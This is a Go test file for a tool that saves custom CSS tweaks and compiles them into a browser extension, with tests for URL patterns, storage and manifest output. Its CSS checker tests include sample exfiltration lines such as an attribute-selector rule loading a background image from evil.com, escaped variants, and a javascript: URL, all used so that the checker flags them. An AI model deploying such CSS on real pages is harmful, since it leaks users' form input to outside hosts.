package retouch

import (
	"encoding/json"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"
)

func TestValidName(t *testing.T) {
	for name, want := range map[string]bool{
		"tema-escuro": true, "a": true, "x_1": true, "0abc": true,
		"": false, "-x": false, "_x": false, "Tema": false, "a b": false, "../x": false,
		strings.Repeat("a", 40): true, strings.Repeat("a", 41): false,
	} {
		if got := ValidName(name); got != want {
			t.Errorf("ValidName(%q) = %v, want %v", name, got, want)
		}
	}
}

func TestValidate(t *testing.T) {
	ok := Retouch{Name: "tema", CSS: "body{}", Matches: []string{"*://a.com/*"}}
	if err := ok.Validate(); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		r    Retouch
		want string
	}{
		{Retouch{Name: "Tema", CSS: "x", Matches: ok.Matches}, "invalid retouch name"},
		{Retouch{Name: "tema", CSS: "  \n", Matches: ok.Matches}, "has no CSS"},
		{Retouch{Name: "tema", CSS: "x"}, "has no URL patterns"},
		{Retouch{Name: "tema", CSS: "x", Matches: []string{"a.com/*"}}, "invalid URL pattern"},
	} {
		err := tc.r.Validate()
		if err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Errorf("Validate(%+v) = %v, want %q", tc.r, err, tc.want)
		}
	}
}

func TestMatchesFor(t *testing.T) {
	for _, tc := range []struct {
		scope Scope
		url   string
		want  []string
	}{
		{ScopeSite, "http://127.0.0.1:8766/mini/pedidos.html?x=1", []string{"*://127.0.0.1/*"}},
		{"", "https://sistema.empresa.com/a", []string{"*://sistema.empresa.com/*"}},
		{ScopePage, "https://a.com/pedidos.html?x=1#y", []string{"*://a.com/pedidos.html", "*://a.com/pedidos.html?*"}},
		{ScopePage, "https://a.com", []string{"*://a.com/", "*://a.com/?*"}},
		{ScopeAll, "about:blank", []string{"<all_urls>"}},
		{ScopeSite, "http://[::1]:3000/x", []string{"*://[::1]/*"}},
	} {
		got, err := MatchesFor(tc.scope, tc.url)
		if err != nil || !reflect.DeepEqual(got, tc.want) {
			t.Errorf("MatchesFor(%q, %q) = %v, %v; want %v", tc.scope, tc.url, got, err, tc.want)
		}
		for _, p := range got {
			if _, err := compilePattern(p); err != nil {
				t.Errorf("pattern %q from MatchesFor does not compile: %v", p, err)
			}
		}
	}
	for _, tc := range []struct {
		scope Scope
		url   string
		want  string
	}{
		{ScopeSite, "file:///tmp/a.html", "http and https"},
		{ScopeSite, "about:blank", "http and https"},
		{ScopeSite, "://x", "http and https"},
		{"everywhere", "https://a.com/", "invalid scope"},
	} {
		if _, err := MatchesFor(tc.scope, tc.url); err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Errorf("MatchesFor(%q, %q) error = %v, want %q", tc.scope, tc.url, err, tc.want)
		}
	}
}

func TestApplies(t *testing.T) {
	site := Retouch{Matches: []string{"*://127.0.0.1/*"}}
	page := Retouch{Matches: []string{"*://a.com/pedidos.html", "*://a.com/pedidos.html?*"}}
	sub := Retouch{Matches: []string{"https://*.empresa.com/app/*"}}
	all := Retouch{Matches: []string{"<all_urls>"}}
	any := Retouch{Matches: []string{"*://*/*"}}
	v6 := Retouch{Matches: []string{"*://[::1]/*"}}
	for _, tc := range []struct {
		r    Retouch
		url  string
		want bool
	}{
		{site, "http://127.0.0.1:8766/mini/x.html", true},
		{site, "https://127.0.0.1/", true},
		{site, "http://127.0.0.2/", false},
		{site, "http://127.0.0.1.evil.com/", false},
		{page, "https://a.com/pedidos.html", true},
		{page, "https://a.com/pedidos.html?n=2", true},
		{page, "https://a.com/pedidos.htmlx", false},
		{page, "https://a.com/clientes.html", false},
		{sub, "https://empresa.com/app/x", true},
		{sub, "https://rh.empresa.com/app/", true},
		{sub, "http://rh.empresa.com/app/", false},
		{sub, "https://rh.empresa.com/outro/", false},
		{sub, "https://evilempresa.com/app/", false},
		{all, "http://x.com/", true},
		{all, "file:///tmp/a", true},
		{all, "chrome://settings", false},
		{any, "https://qualquer.com/a/b", true},
		{v6, "http://[::1]:3000/x", true},
		{Retouch{Matches: []string{"bad"}}, "http://x.com/", false},
	} {
		if got := tc.r.Applies(tc.url); got != tc.want {
			t.Errorf("%v.Applies(%q) = %v, want %v", tc.r.Matches, tc.url, got, tc.want)
		}
	}
}

func TestCompilePatternErrors(t *testing.T) {
	for _, p := range []string{"", "a.com", "*://a.com", "ftp://a.com/*", "*:///x", "*://a.com:80/*", "*://a*.com/*", "*://*.*.com/*", "*://x.*/*"} {
		if _, err := compilePattern(p); err == nil {
			t.Errorf("compilePattern(%q) should fail", p)
		}
	}
	for _, p := range []string{"<all_urls>", "*://*/*", "http://a.com/", "https://*.a.com/x/*", "*://[::1]/*"} {
		if _, err := compilePattern(p); err != nil {
			t.Errorf("compilePattern(%q): %v", p, err)
		}
	}
}

func TestStore(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "retoques")
	clock := time.Date(2026, 10, 4, 21, 0, 0, 0, time.UTC)
	s := Store{Dir: dir, Now: func() time.Time { return clock }}

	list, bad, err := s.List()
	if err != nil || list != nil || bad != nil {
		t.Fatalf("empty store: %v %v %v", list, bad, err)
	}
	r := Retouch{Name: "tema", Description: "Tema escuro", Scope: ScopeSite, Matches: []string{"*://a.com/*"}, CSS: "body{color:#fff}"}
	if replaced, err := s.Save(r); err != nil || replaced {
		t.Fatalf("first save: %v %v", replaced, err)
	}
	got, err := s.Load("tema")
	if err != nil || !reflect.DeepEqual(got, r) {
		t.Fatalf("load: %+v %v", got, err)
	}
	for _, f := range []string{"retoque.yaml", "style.css"} {
		info, err := os.Stat(filepath.Join(dir, "tema", f))
		if err != nil || info.Mode().Perm() != 0o600 {
			t.Fatalf("%s: %v %v", f, info, err)
		}
	}
	if info, _ := os.Stat(dir); info.Mode().Perm() != 0o700 {
		t.Fatalf("store dir mode %v", info.Mode().Perm())
	}

	// Duas trocas no mesmo segundo: duas versões no histórico, sem sobrescrever.
	r2 := r
	r2.CSS = "body{color:#000}"
	if replaced, err := s.Save(r2); err != nil || !replaced {
		t.Fatalf("second save: %v %v", replaced, err)
	}
	r3 := r
	r3.CSS = "body{color:red}"
	if _, err := s.Save(r3); err != nil {
		t.Fatal(err)
	}
	h1, err := os.ReadFile(filepath.Join(dir, "tema", ".history", "20261004-210000", "style.css"))
	if err != nil || string(h1) != r.CSS {
		t.Fatalf("history 1: %q %v", h1, err)
	}
	h2, err := os.ReadFile(filepath.Join(dir, "tema", ".history", "20261004-210000-2", "style.css"))
	if err != nil || string(h2) != r2.CSS {
		t.Fatalf("history 2: %q %v", h2, err)
	}
	if _, err := os.Stat(filepath.Join(dir, "tema", ".history", "20261004-210000", "retoque.yaml")); err != nil {
		t.Fatal(err)
	}
	if got, _ := s.Load("tema"); got.CSS != r3.CSS {
		t.Fatalf("current css %q", got.CSS)
	}

	// Pasta quebrada, nome inválido e arquivo solto: List separa ou ignora.
	if err := os.MkdirAll(filepath.Join(dir, "quebrado"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "quebrado", "retoque.yaml"), []byte("name: [x"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(dir, "Maiusculo"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "solto.txt"), []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	other := Retouch{Name: "abc", Matches: []string{"<all_urls>"}, CSS: "a{}"}
	if _, err := s.Save(other); err != nil {
		t.Fatal(err)
	}
	list, bad, err = s.List()
	if err != nil || len(list) != 2 || list[0].Name != "abc" || list[1].Name != "tema" {
		t.Fatalf("list: %+v %v", list, err)
	}
	if len(bad) != 1 || bad["quebrado"] == nil {
		t.Fatalf("bad: %v", bad)
	}

	// Sem style.css o retoque não carrega.
	if err := os.Remove(filepath.Join(dir, "abc", "style.css")); err != nil {
		t.Fatal(err)
	}
	if _, err := s.Load("abc"); err == nil {
		t.Fatal("load without style.css should fail")
	}

	for name, want := range map[string]string{"nada": "no retouch named", "../x": "invalid retouch name"} {
		if _, err := s.Load(name); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("Load(%q) = %v, want %q", name, err, want)
		}
		if err := s.Delete(name); err == nil {
			t.Errorf("Delete(%q) should fail", name)
		}
	}
	if err := s.Delete("tema"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(dir, "tema")); !os.IsNotExist(err) {
		t.Fatalf("tema should be gone: %v", err)
	}
	if _, err := s.Save(Retouch{Name: "Bad"}); err == nil {
		t.Fatal("save of an invalid retouch should fail")
	}
}

func TestStoreDefaultClock(t *testing.T) {
	s := Store{Dir: t.TempDir()}
	if d := time.Since(s.now()); d < 0 || d > time.Minute {
		t.Fatalf("default clock off by %v", d)
	}
}

func TestCheckCSS(t *testing.T) {
	own := []string{"*://a.com/*"}
	for _, tc := range []struct {
		css  string
		want []string // hosts que devem aparecer, na ordem
	}{
		{`body { background: url(img/fundo.png) }`, nil},
		{`body { background: url("https://a.com/x.png") }`, nil},
		{`body { background: url(data:image/png;base64,AAAA) }`, nil},
		{`a { background: url(#frag) }`, nil},
		{`input[value^="a"] { background: url(https://evil.com/a) }`, []string{"evil.com"}},
		{`input[value^="a"] { background: url( 'HTTPS://Evil.com/a' ) }`, []string{"evil.com"}},
		{`@import "https://fonts.example.org/x.css";`, []string{"fonts.example.org"}},
		{`@import url(//cdn.x.net/y.css);`, []string{"cdn.x.net"}},
		{`@import 'local.css';`, nil},
		{`div { background-image: image-set("https://i.x.com/1.png" 1x, 'https://i.y.com/2.png' 2x) }`, []string{"i.x.com", "i.y.com"}},
		{`div { background-image: -webkit-image-set("img/a.png" 1x) }`, nil},
		{`@font-face { font-family: X; src: url(https://f.z.io/x.woff2) }`, []string{"f.z.io"}},
		{`a { b: \75 rl(https://esc.com/a) }`, []string{"esc.com"}},
		{`a { b: u\72l(https://esc2.com/a) }`, []string{"esc2.com"}},
		{`/* url(https://comment.com/x) */ a { color: red }`, nil},
		{`a { b: url(javascript:alert(1)) }`, []string{"javascript:alert(1"}},
		{`a { b: url(https://dup.com/a) } c { d: url(https://dup.com/a) } e { f: url(https://dup.com/b) }`, []string{"dup.com", "dup.com"}},
		{`a { b: url(https://dup.com/a`, []string{"dup.com"}},
		{`a { b: url("https://q.com/a`, []string{"q.com"}},
		{`a { b: url(`, nil},
	} {
		got := CheckCSS(tc.css, own)
		if len(got) != len(tc.want) {
			t.Errorf("CheckCSS(%q) = %v, want hosts %v", tc.css, got, tc.want)
			continue
		}
		for i, host := range tc.want {
			if !strings.Contains(got[i], "("+host+")") || !strings.Contains(got[i], "ignoreWarnings=true") {
				t.Errorf("CheckCSS(%q)[%d] = %q, want host %q", tc.css, i, got[i], host)
			}
		}
	}
	// Retoque de todos os sites: qualquer host de fora avisa; subdomínio do próprio site não avisa.
	if got := CheckCSS(`a{b:url(https://a.com/x)}`, []string{"<all_urls>"}); len(got) != 1 {
		t.Errorf("all_urls should warn on any absolute URL: %v", got)
	}
	if got := CheckCSS(`a{b:url(https://rh.empresa.com/x)}`, []string{"https://*.empresa.com/*", "*://[::1]/*"}); len(got) != 1 {
		t.Errorf("only the exact own hosts are trusted: %v", got)
	}
	if got := CheckCSS(`a{b:url(https://empresa.com/x)} c{d:url(http://[::1]:3000/y)}`, []string{"https://*.empresa.com/*", "*://[::1]/*"}); len(got) != 0 {
		t.Errorf("own hosts should not warn: %v", got)
	}
}

func TestUnescapeCSS(t *testing.T) {
	for in, want := range map[string]string{
		`\75 rl`:    "url",
		`\000075rl`: "url",
		`\75\72l`:   "url",
		`a\:b`:      "a:b",
		`end\`:      `end\`,
		`\41\42`:    "AB",
		"\\41\tB":   "AB",
		"\\41\nB":   "AB",
	} {
		if got := unescapeCSS(in); got != want {
			t.Errorf("unescapeCSS(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestCompile(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "build", "retoques")
	if Ready(dir) {
		t.Fatal("not compiled yet")
	}
	list := []Retouch{
		{Name: "tema", Description: "Tema escuro", Matches: []string{"*://a.com/*"}, CSS: "body{color:#fff}</script>\u2028"},
		{Name: "fonte", Matches: []string{"<all_urls>"}, CSS: "td{font-size:16px}"},
		{Name: "invalido", Matches: nil, CSS: "x{}"},
	}
	icons := map[int][]byte{48: []byte("png48"), 16: []byte("png16")}
	if err := Compile(dir, list, icons); err != nil {
		t.Fatal(err)
	}
	if !Ready(dir) {
		t.Fatal("compiled extension should be ready")
	}
	var m map[string]any
	data, err := os.ReadFile(filepath.Join(dir, "manifest.json"))
	if err != nil || json.Unmarshal(data, &m) != nil {
		t.Fatalf("manifest: %v\n%s", err, data)
	}
	if m["manifest_version"].(float64) != 3 || m["name"] != ExtensionName || m["version"] != "1.0" {
		t.Fatalf("manifest header: %v", m)
	}
	if !reflect.DeepEqual(m["permissions"], []any{"storage"}) {
		t.Fatalf("permissions should be only storage: %v", m["permissions"])
	}
	if m["background"].(map[string]any)["service_worker"] != "sw.js" {
		t.Fatalf("background: %v", m["background"])
	}
	act := m["action"].(map[string]any)
	if act["default_popup"] != "popup.html" || act["default_icon"].(map[string]any)["16"] != "icons/icon-16.png" {
		t.Fatalf("action: %v", act)
	}
	if m["icons"].(map[string]any)["48"] != "icons/icon-48.png" {
		t.Fatalf("icons: %v", m["icons"])
	}
	cs := m["content_scripts"].([]any)
	if len(cs) != 2 {
		t.Fatalf("invalid retouches must not compile: %v", cs)
	}
	first := cs[0].(map[string]any)
	if !reflect.DeepEqual(first["matches"], []any{"*://a.com/*"}) || !reflect.DeepEqual(first["js"], []any{"runtime.js", "r/tema.js"}) || first["run_at"] != "document_start" {
		t.Fatalf("content script: %v", first)
	}
	script, err := os.ReadFile(filepath.Join(dir, "r", "tema.js"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(string(script), `globalThis.__vitralRetoques.add("tema", "body{color:#fff}\u003c/script\u003e\u2028");`) {
		t.Fatalf("retouch script must be a safe JS literal: %s", script)
	}
	for _, f := range []string{"runtime.js", "sw.js", "popup.html", "popup.js", "popup.css", "icons/icon-16.png", "icons/icon-48.png"} {
		if _, err := os.Stat(filepath.Join(dir, f)); err != nil {
			t.Errorf("missing %s: %v", f, err)
		}
	}
	var about map[string]map[string]string
	data, _ = os.ReadFile(filepath.Join(dir, "retoques.json"))
	if json.Unmarshal(data, &about) != nil || about["tema"]["description"] != "Tema escuro" || about["fonte"]["title"] != "fonte" {
		t.Fatalf("retoques.json: %s", data)
	}

	// Recompilar troca a pasta inteira (nada sobra do retoque removido) e não deixa .new nem .old.
	if err := Compile(dir, list[1:2], nil); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(dir, "r", "tema.js")); !os.IsNotExist(err) {
		t.Fatalf("old retouch should be gone: %v", err)
	}
	if _, err := os.Stat(filepath.Join(dir, "icons")); !os.IsNotExist(err) {
		t.Fatalf("icons should be gone without icons: %v", err)
	}
	for _, f := range []string{dir + ".new", dir + ".old"} {
		if _, err := os.Stat(f); !os.IsNotExist(err) {
			t.Errorf("%s should not exist: %v", f, err)
		}
	}
	data, _ = os.ReadFile(filepath.Join(dir, "manifest.json"))
	m = nil
	if json.Unmarshal(data, &m) != nil || len(m["content_scripts"].([]any)) != 1 || m["icons"] != nil {
		t.Fatalf("recompiled manifest: %s", data)
	}

	// Sem retoques: a extensão existe (o botão do painel) e não tem content scripts.
	if err := Compile(dir, nil, nil); err != nil || !Ready(dir) {
		t.Fatalf("empty compile: %v", err)
	}
	data, _ = os.ReadFile(filepath.Join(dir, "manifest.json"))
	if strings.Contains(string(data), "content_scripts") {
		t.Fatalf("empty extension should have no content scripts: %s", data)
	}

	// Ready recusa manifest inválido ou de outra versão.
	bad := t.TempDir()
	for _, body := range []string{"{", `{"manifest_version": 2}`} {
		if err := os.WriteFile(filepath.Join(bad, "manifest.json"), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
		if Ready(bad) {
			t.Errorf("Ready(%s) should be false", body)
		}
	}
}

func TestBuilder(t *testing.T) {
	store := Store{Dir: filepath.Join(t.TempDir(), "retoques")}
	b := Builder{Store: store}
	if b.Dir() != filepath.Join(store.Dir, ".build") {
		t.Fatalf("dir %s", b.Dir())
	}
	dirs, err := b.Launch()
	if err != nil || dirs != nil {
		t.Fatalf("no retouches, nothing to load: %v %v", dirs, err)
	}
	if _, err := store.Save(Retouch{Name: "tema", Matches: []string{"*://a.com/*"}, CSS: "a{}"}); err != nil {
		t.Fatal(err)
	}
	dirs, err = b.Launch()
	if err != nil || !reflect.DeepEqual(dirs, []string{b.Dir()}) || !Ready(b.Dir()) {
		t.Fatalf("launch: %v %v", dirs, err)
	}
	// A pasta gerada fica dentro da dos retoques e não aparece como retoque.
	list, bad, err := store.List()
	if err != nil || len(list) != 1 || len(bad) != 0 {
		t.Fatalf("build dir must not show up as a retouch: %v %v %v", list, bad, err)
	}
	if n, err := b.Build(); err != nil || n != 1 {
		t.Fatalf("build: %d %v", n, err)
	}
	// Pasta dos retoques ilegível: o erro sobe.
	file := filepath.Join(t.TempDir(), "arquivo")
	if err := os.WriteFile(file, []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := (Builder{Store: Store{Dir: file}}).Launch(); err == nil {
		t.Fatal("a file as the retouches dir should fail")
	}
}
